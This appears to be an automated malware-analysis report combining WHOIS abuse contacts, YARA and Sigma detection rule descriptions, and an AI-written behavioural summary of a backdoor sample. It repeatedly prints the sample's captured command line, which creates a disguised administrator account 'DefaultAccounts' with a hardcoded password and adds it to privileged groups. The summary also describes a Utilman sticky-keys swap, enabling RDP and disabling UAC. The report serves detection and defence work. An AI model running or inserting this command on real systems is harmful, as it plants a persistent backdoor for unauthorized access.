remarks.title: Registration Comments
description: To report suspected security issues specific to
traffic emanating from Microsoft online services,
including the distribution of malicious content
or other illicit or illegal material through a
Microsoft online service, please submit reports
to:
* https://cert.microsoft.com.
For SPAM and other abuse issues, such as Microsoft
Accounts, please contact:
* abuse@microsoft.com.
To report security vulnerabilities in Microsoft
products and services, please contact:
* secure@microsoft.com.
For legal and law enforcement-related requests,
please contact:
* msndcc@microsoft.com
For routing, peering or DNS issues, please
contact:
* IOC@microsoft.com

crowdsourced_yara_results.description: Detects PE Type babyShark loader mentioned in February 2019 blog post by PaloAltNetworks
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

sigma_analysis_results.rule_description: This rule triggers on user accounts that are added to the local Administrators group, which could be legitimate activity or a sign of privilege escalation activity
Detects when an attacker tries to disable User Account Control (UAC) by changing its registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA from 1 to 0

sigma_analysis_results.rule_title: Add User to Local Administrators Group
sigma_analysis_results.rule_description: Detects suspicious command line that adds an account to the local administrators/administrateurs group
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)

values.CommandLine: C:\Windows\System32\cmd.exe /c C:&cd\&cd windows&cd system32&net user DefaultAccounts Security1215! /add&net user DefaultAccounts /FULLNAME:"IIS Host Account" /COMMENT:"A user account managed by the IIS subsystem." /EXPIRES:NEVER /Active:YES&net localgroup users DefaultAccounts /delete&net localgroup Administrators DefaultAccounts /add&net localgroup "Network Configuration Operators" DefaultAccounts /add&net localgroup "Power Users" DefaultAccounts /add&exit

values.ParentCommandLine: C:\Windows\System32\cmd.exe /c C:&cd\&cd windows&cd system32&net user DefaultAccounts Security1215! /add&net user DefaultAccounts /FULLNAME:"IIS Host Account" /COMMENT:"A user account managed by the IIS subsystem." /EXPIRES:NEVER /Active:YES&net localgroup users DefaultAccounts /delete&net localgroup Administrators DefaultAccounts /add&net localgroup "Network Configuration Operators" DefaultAccounts /add&net localgroup "Power Users" DefaultAccounts /add&exit

sigma_analysis_results.rule_title: User Added to Local Administrators Group
sigma_analysis_results.rule_description: Detects addition of users to the local administrator group via "Net" or "Add-LocalGroupMember".
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)

values.CommandLine: C:\Windows\System32\cmd.exe /c C:&cd\&cd windows&cd system32&net user DefaultAccounts Security1215! /add&net user DefaultAccounts /FULLNAME:"IIS Host Account" /COMMENT:"A user account managed by the IIS subsystem." /EXPIRES:NEVER /Active:YES&net localgroup users DefaultAccounts /delete&net localgroup Administrators DefaultAccounts /add&net localgroup "Network Configuration Operators" DefaultAccounts /add&net localgroup "Power Users" DefaultAccounts /add&exit

sigma_analysis_results.rule_title: Creation of an Executable by an Executable
sigma_analysis_results.rule_description: Detects the creation of an executable by another executable

sigma_analysis_results.rule_title: A Member Was Added to a Security-Enabled Global Group
sigma_analysis_results.rule_description: Detects activity when a member is added to a security-enabled global group
Detects execution of Net.exe, whether suspicious or benign.
sigma_analysis_results.rule_author: Michael Haag, Mark Woan (improvements), James Pemberton / @4A616D6573 / oscd.community (improvements)

values.ParentCommandLine: C:\Windows\System32\cmd.exe /c C:&cd\&cd windows&cd system32&net user DefaultAccounts Security1215! /add&net user DefaultAccounts /FULLNAME:"IIS Host Account" /COMMENT:"A user account managed by the IIS subsystem." /EXPIRES:NEVER /Active:YES&net localgroup users DefaultAccounts /delete&net localgroup Administrators DefaultAccounts /add&net localgroup "Network Configuration Operators" DefaultAccounts /add&net localgroup "Power Users" DefaultAccounts /add&exit

values.CommandLine: net  user DefaultAccounts /FULLNAME:"IIS Host Account" /COMMENT:"A user account managed by the IIS subsystem." /EXPIRES:NEVER /Active:YES
values.ParentCommandLine: C:\Windows\System32\cmd.exe /c C:&cd\&cd windows&cd system32&net user DefaultAccounts Security1215! /add&net user DefaultAccounts /FULLNAME:"IIS Host Account" /COMMENT:"A user account managed by the IIS subsystem." /EXPIRES:NEVER /Active:YES&net localgroup users DefaultAccounts /delete&net localgroup Administrators DefaultAccounts /add&net localgroup "Network Configuration Operators" DefaultAccounts /add&net localgroup "Power Users" DefaultAccounts /add&exit

values.CommandLine: C:\Windows\system32\net1  user DefaultAccounts /FULLNAME:"IIS Host Account" /COMMENT:"A user account managed by the IIS subsystem." /EXPIRES:NEVER /Active:YES
values.ParentCommandLine: net  user DefaultAccounts /FULLNAME:"IIS Host Account" /COMMENT:"A user account managed by the IIS subsystem." /EXPIRES:NEVER /Active:YES

C:\Windows\System32\cmd.exe /c C:&cd\&cd windows&cd system32&net user DefaultAccounts Security1215! /add&net user DefaultAccounts /FULLNAME:"IIS Host Account" /COMMENT:"A user account managed by the IIS subsystem." /EXPIRES:NEVER /Active:YES&net localgroup users DefaultAccounts /delete&net localgroup Administrators DefaultAccounts /add&net localgroup "Network Configuration Operators" DefaultAccounts /add&net localgroup "Power Users" DefaultAccounts /add&exit

crowdsourced_ai_results.analysis: The malware establishes persistence and creates a backdoor. It replaces the Utility Manager (`Utilman.exe`) with a copy of itself, a technique known as a "sticky keys" attack, to gain privileged execution from the logon screen (sub_401060). It then creates a new administrative user named 'DefaultAccounts' with the hardcoded password 'Security1215!' (`sub_401410`) and subsequently hides this account from the Welcome screen by modifying the 'Winlogon' registry key (`sub_401500`). To facilitate remote access, it enables RDP (`fDenyTSConnections`=0) and disables UAC (`EnableLUA`=0) by modifying system and LSA registry keys (`sub_401650`, `sub_4017a0`).

C:\Windows\System32\cmd.exe /c C:&cd\&cd windows&cd system32&net user DefaultAccounts Security1215! /add&net user DefaultAccounts /FULLNAME:"IIS Host Account" /COMMENT:"A user account managed by the IIS subsystem." /EXPIRES:NEVER /Active:YES&net localgroup users DefaultAccounts /delete&net localgroup Administrators DefaultAccounts /add&net localgroup "Network Configuration Operators" DefaultAccounts /add&net localgroup "Power Users" DefaultAccounts /add&exit

crowdsourced_ai_results.analysis: The malware establishes persistence and creates a backdoor. It replaces the Utility Manager (`Utilman.exe`) with a copy of itself, a technique known as a "sticky keys" attack, to gain privileged execution from the logon screen (sub_401060). It then creates a new administrative user named 'DefaultAccounts' with the hardcoded password 'Security1215!' (`sub_401410`) and subsequently hides this account from the Welcome screen by modifying the 'Winlogon' registry key (`sub_401500`). To facilitate remote access, it enables RDP (`fDenyTSConnections`=0) and disables UAC (`EnableLUA`=0) by modifying system and LSA registry keys (`sub_401650`, `sub_4017a0`).
